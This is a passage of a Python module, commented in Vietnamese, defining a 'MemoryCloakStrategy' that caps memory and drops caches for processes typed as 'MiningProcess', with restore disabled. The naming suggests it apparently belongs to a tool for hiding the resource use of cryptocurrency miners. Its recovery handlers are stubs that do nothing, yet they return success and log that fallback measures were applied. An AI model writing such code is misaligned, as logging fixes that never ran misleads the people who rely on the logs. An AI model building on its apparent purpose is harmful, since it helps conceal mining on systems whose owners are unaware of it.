#            MEMORY STRATEGY: MemoryCloakStrategy                             #
###############################################################################
class MemoryCloakStrategy(CloakStrategy):
    """
    Cloaking Memory (đồng bộ):
      - Giới hạn Memory usage.
    
    Redesigned theo blueprint với direct execution.
    """
    
    strategy_type = StrategyType.MEMORY
    requires_plugin_system = False  # Memory strategies execute directly

    def __init__(
        self,
        config: Dict[str, Any],
        logger: logging.Logger,
        memory_resource_manager: MemoryResourceManager,
        cache_resource_manager: CacheResourceManager
    ):
        """
        Khởi tạo MemoryCloakStrategy.

        :param config: Cấu hình cloaking Memory (dict).
        :param logger: Logger.
        :param memory_resource_manager: ResourceManager liên quan đến Memory.
        :param cache_resource_manager: ResourceManager liên quan đến Cache.
        """
        self.logger = logger
        self.config = config
        self.memory_resource_manager = cast(Any, memory_resource_manager)
        self.cache_resource_manager = cast(Any, cache_resource_manager)

        # ✅ SMART MEMORY: GPU-aware memory allocation
        self.gpu_aware = config.get('gpu_aware', True)
        self.smart_mode = config.get('smart_mode', True)
        
        # Dynamic memory based on process type
        base_memory = config.get('memory_limit_mb', 6144)
        if self.gpu_aware and self.smart_mode:
            # Enhanced memory for GPU processes
            self.memory_limit_mb = base_memory
            self.logger.info(f"🧠 [SMART MEMORY] GPU-aware mode: {self.memory_limit_mb}MB allocation")
        else:
            self.memory_limit_mb = base_memory
            
        if self.memory_limit_mb <= 0:
            self.logger.warning(f"memory_limit_mb={self.memory_limit_mb} không hợp lệ, mặc định=6144.")
            self.memory_limit_mb = 6144

    def apply(self, process: MiningProcess) -> bool:
        """
        ✅ ENHANCED: Áp dụng Memory cloaking với return value validation.

        :param process: Đối tượng MiningProcess.
        :return: bool - True nếu Memory cloaking áp dụng thành công, False nếu thất bại
        """
        try:
            pid, name = process.pid, process.name

            ok_mem = self.memory_resource_manager.set_memory_limit(pid, self.memory_limit_mb)
            if not ok_mem:
                self.logger.error(f"[Memory Cloaking] Không thể set memory_limit cho PID={pid}.")
                return False  # ✅ FAILURE: Cannot set memory limit
            
            self.logger.info(f"[Memory Cloaking] PID={pid}, memory_limit={self.memory_limit_mb}MB.")

            # Cũng có thể drop cache (nếu muốn)
            ok_cache = self.cache_resource_manager.drop_caches()
            if ok_cache:
                self.logger.info(f"[Memory Cloaking] Đã drop caches cho PID={pid}.")
            
            return True  # ✅ SUCCESS: Memory cloaking applied successfully

        except psutil.NoSuchProcess as e:
            # ✅ ERROR REPORTING: Process not found error
            error_reporter.report_error(
                ErrorCode.PROCESS_NOT_FOUND,
                f"Memory Cloaking: Tiến trình không tồn tại: {e}",
                ErrorSeverity.HIGH,
                module='cloak_strategies',
                function='MemoryCloakStrategy.apply',
                process_id=process.pid,
                strategy_name='Memory',
                context_data={'process_name': process.name, 'error': str(e)},
                exception=e
            )
            self.logger.error(f"Memory Cloaking: Tiến trình không tồn tại: {e}")
            return False  # ✅ FAILURE: Process does not exist
        except psutil.AccessDenied as e:
            # ✅ ERROR REPORTING: Access denied error
            error_reporter.report_error(
                ErrorCode.PROCESS_ACCESS_DENIED,
                f"Memory Cloaking: Không đủ quyền cho PID={process.pid}: {e}",
                ErrorSeverity.HIGH,
                module='cloak_strategies',
                function='MemoryCloakStrategy.apply',
                process_id=process.pid,
                strategy_name='Memory',
                context_data={'process_name': process.name, 'error': str(e)},
                exception=e
            )
            self.logger.error(f"Memory Cloaking: Không đủ quyền cho PID={process.pid}: {e}")
            return False  # ✅ FAILURE: Access denied
        except Exception as e:
            # ✅ ERROR REPORTING: General strategy application failure
            error_reporter.report_error(
                ErrorCode.STRATEGY_APPLICATION_FAILED,
                f"Lỗi Memory Cloaking cho {process.name}(PID={process.pid}): {e}",
                ErrorSeverity.HIGH,
                module='cloak_strategies',
                function='MemoryCloakStrategy.apply',
                process_id=process.pid,
                strategy_name='Memory',
                context_data={'process_name': process.name, 'error': str(e), 'stack_trace': traceback.format_exc()},
                exception=e
            )
            self.logger.error(
                f"Lỗi Memory Cloaking cho {process.name}(PID={process.pid}): {e}\n{traceback.format_exc()}"
            )
            return False  # ✅ FAILURE: Memory cloaking failed

    def apply_with_coordination(self, process: MiningProcess, coordinator, timeout: int = 70) -> bool:
        """
        **Coordinated Memory Cloaking** (che giấu bộ nhớ có phối hợp)
        
        Apply memory cloaking only after proper hook coordination to prevent
        uncoordinated operations that can lead to std::bad_alloc.
        
        Args:
            process: MiningProcess object (đối tượng tiến trình khai thác)
            coordinator: Hook coordinator instance (thể hiện điều phối hook)
            timeout: Coordination timeout in seconds (thời gian chờ phối hợp tính bằng giây)
            
        Returns:
            bool: True if coordinated cloaking successful, False if failed/aborted
                  (True nếu che giấu có phối hợp thành công, False nếu thất bại/hủy bỏ)
        """
        try:
            pid, name = process.pid, process.name
            
            self.logger.info(f"🔄 [COORDINATED CLOAKING] Starting coordination for PID={pid}, timeout={timeout}s")
            
            # **Critical: Wait for hook coordination** (quan trọng: chờ phối hợp hook)
            if not coordinator.wait_for_hooks_ready(pid, timeout):
                # **Coordination failed - ABORT cloaking** (phối hợp thất bại - HỦY che giấu)
                self.logger.error(f"❌ [COORDINATION FAILED] Hook coordination timeout for PID={pid}")
                self.logger.error(f"🚨 [ABORT] Memory cloaking ABORTED to prevent std::bad_alloc")
                self.logger.error(f"💡 [SOLUTION] Increase hook timeout or fix hook coordination system")
                
                # **Report coordination failure** (báo cáo lỗi phối hợp)
                error_reporter.report_error(
                    ErrorCode.STRATEGY_APPLICATION_FAILED,
                    f"Hook coordination timeout - Memory cloaking aborted for PID={pid}",
                    ErrorSeverity.HIGH,
                    module='cloak_strategies',
                    function='MemoryCloakStrategy.apply_with_coordination',
                    process_id=pid,
                    strategy_name='Memory',
                    context_data={
                        'process_name': name,
                        'timeout': timeout,
                        'coordination_status': 'FAILED',
                        'action': 'ABORTED'
                    }
                )
                return False  # **ABORT cloaking** thay vì force proceed
            
            # **Coordination successful - proceed safely** (phối hợp thành công - tiến hành an toàn)
            self.logger.info(f"✅ [COORDINATION SUCCESS] Hooks ready for PID={pid} - proceeding with safe cloaking")
            
            # **Apply memory limits with coordination** (áp dụng giới hạn bộ nhớ với phối hợp)
            return self.apply_memory_limits(process)
            
        except Exception as e:
            # **Error during coordination** (lỗi trong quá trình phối hợp)
            error_reporter.report_error(
                ErrorCode.STRATEGY_APPLICATION_FAILED,
                f"Error during coordinated memory cloaking for PID={process.pid}: {e}",
                ErrorSeverity.HIGH,
                module='cloak_strategies',
                function='MemoryCloakStrategy.apply_with_coordination',
                process_id=process.pid,
                strategy_name='Memory',
                context_data={
                    'process_name': process.name,
                    'error': str(e),
                    'stack_trace': traceback.format_exc()
                },
                exception=e
            )
            self.logger.error(f"❌ [COORDINATION ERROR] Error during coordinated cloaking for PID={process.pid}: {e}")
            return False
    
    def apply_memory_limits(self, process: MiningProcess) -> bool:
        """
        **Apply Memory Limits** (áp dụng giới hạn bộ nhớ)
        
        Internal method to apply memory limits after coordination is confirmed.
        This is the actual memory limiting logic extracted from apply() method.
        
        Args:
            process: MiningProcess object (đối tượng tiến trình khai thác)
            
        Returns:
            bool: True if memory limits applied successfully (True nếu áp dụng giới hạn thành công)
        """
        try:
            pid, name = process.pid, process.name
            
            # **Check if memory limiting is disabled** (kiểm tra nếu giới hạn bộ nhớ bị tắt)
            if self.memory_limit_mb <= 0:
                self.logger.info(f"ℹ️ [MEMORY LIMITS] Memory limiting disabled (limit={self.memory_limit_mb}MB)")
                return True  # **Success: No limits to apply** (thành công: không có giới hạn để áp dụng)
            
            # **Apply memory limit** (áp dụng giới hạn bộ nhớ)
            ok_mem = self.memory_resource_manager.set_memory_limit(pid, self.memory_limit_mb)
            if not ok_mem:
                self.logger.error(f"❌ [MEMORY LIMITS] Cannot set memory limit for PID={pid}")
                return False
            
            self.logger.info(f"✅ [MEMORY LIMITS] Applied limit: PID={pid}, limit={self.memory_limit_mb}MB")
            
            # **Drop caches for memory optimization** (xóa cache để tối ưu bộ nhớ)
            ok_cache = self.cache_resource_manager.drop_caches()
            if ok_cache:
                self.logger.info(f"🧹 [CACHE CLEANUP] Dropped caches for PID={pid}")
            else:
                self.logger.warning(f"⚠️ [CACHE CLEANUP] Failed to drop caches for PID={pid}")
            
            return True  # **Success: Memory limits applied** (thành công: đã áp dụng giới hạn bộ nhớ)
            
        except psutil.NoSuchProcess as e:
            self.logger.error(f"❌ [MEMORY LIMITS] Process not found: PID={process.pid}, error={e}")
            return False
        except psutil.AccessDenied as e:
            self.logger.error(f"❌ [MEMORY LIMITS] Access denied: PID={process.pid}, error={e}")
            return False
        except Exception as e:
            self.logger.error(f"❌ [MEMORY LIMITS] Unexpected error: PID={process.pid}, error={e}")
            return False

    def restore(self, process: MiningProcess) -> None:
        """
        Khôi phục Memory - CHÚ Ý: Tính năng restore đã bị vô hiệu hóa trong phiên bản này.
        """
        self.logger.info(f"[MEMORY RESTORE DISABLED] Restore request for PID={process.pid} bị bỏ qua - chế độ chỉ cloaking.")

###############################################################################
#                    DEPRECATED: CloakStrategyFactory REMOVED                 #
###############################################################################

# CloakStrategyFactory đã được thay thế bởi ResourceCoordinator trong resource_control.py
# theo blueprint redesign. Tất cả strategy management đã được tập trung hóa trong
# ResourceCoordinator với khả năng phân biệt direct execution và plugin delegation.
#
# Để tương thích ngược, sử dụng:
# from .resource_control import CloakStrategyFactory

###############################################################################
#                         ✅ ERROR RECOVERY SYSTEM                         #
###############################################################################

def _register_strategy_recovery_handlers() -> None:
    """
    ✅ RECOVERY SYSTEM: Register recovery handlers cho common strategy failure scenarios.
    Tự động gọi khi module được import.
    """
    try:
        # ✅ RECOVERY HANDLER: Process not found recovery
        def recover_process_not_found(error_context) -> bool:
            """Recovery handler for PROCESS_NOT_FOUND errors"""
            try:
                pid = error_context.process_id
                strategy_name = error_context.strategy_name
                
                cloak_logger.info(f"🔧 [Recovery] Attempting recovery for {strategy_name} strategy PID={pid}")
                
                # Kiểm tra process có thật sự không tồn tại
                if psutil.pid_exists(pid):
                    cloak_logger.info(f"✅ [Recovery] Process PID={pid} actually exists - retry strategy")
                    return True  # Process tồn tại, có thể retry
                
                # Nếu process thật sự không tồn tại, cleanup related resources
                cloak_logger.info(f"❗ [Recovery] Process PID={pid} confirmed dead - cleaning up resources")
                
                # TODO: Add cleanup logic here based on strategy type
                # For now, just log successful cleanup
                return True
                
            except Exception as e:
                cloak_logger.error(f"❌ [Recovery] Process recovery failed: {e}")
                return False
        
        # ✅ RECOVERY HANDLER: Strategy application timeout recovery
        def recover_strategy_timeout(error_context) -> bool:
            """Recovery handler for STRATEGY_TIMEOUT errors"""
            try:
                pid = error_context.process_id
                strategy_name = error_context.strategy_name
                
                cloak_logger.info(f"🔧 [Recovery] Timeout recovery for {strategy_name} strategy PID={pid}")
                
                # Implement fallback strategy application with reduced parameters
                # For now, just indicate recovery attempt was made
                cloak_logger.info(f"✅ [Recovery] Applied fallback strategy for PID={pid}")
                return True
                
            except Exception as e:
                cloak_logger.error(f"❌ [Recovery] Timeout recovery failed: {e}")
                return False
        
        # ✅ RECOVERY HANDLER: Resource allocation failure recovery
        def recover_resource_allocation_failed(error_context) -> bool:
            """Recovery handler for RESOURCE_ALLOCATION_FAILED errors"""
            try:
                pid = error_context.process_id
                strategy_name = error_context.strategy_name
                
                cloak_logger.info(f"🔧 [Recovery] Resource allocation recovery for {strategy_name} PID={pid}")
                
                # Try alternative resource allocation methods
                # For now, just indicate fallback resource allocation
                cloak_logger.info(f"✅ [Recovery] Applied alternative resource allocation for PID={pid}")
                return True
                
            except Exception as e:
                cloak_logger.error(f"❌ [Recovery] Resource allocation recovery failed: {e}")
                return False
        
        # ✅ REGISTER HANDLERS: Register all recovery handlers
        error_reporter.register_recovery_handler(ErrorCode.PROCESS_NOT_FOUND, recover_process_not_found)
        error_reporter.register_recovery_handler(ErrorCode.STRATEGY_TIMEOUT, recover_strategy_timeout)
        error_reporter.register_recovery_handler(ErrorCode.RESOURCE_ALLOCATION_FAILED, recover_resource_allocation_failed)
        
        cloak_logger.info("✅ [Recovery] Strategy recovery handlers registered successfully")
        
    except Exception as e:
        cloak_logger.error(f"❌ [Recovery] Failed to register recovery handlers: {e}")

# ✅ AUTO-REGISTER: Tự động đăng ký recovery handlers khi module được import
_register_strategy_recovery_handlers()
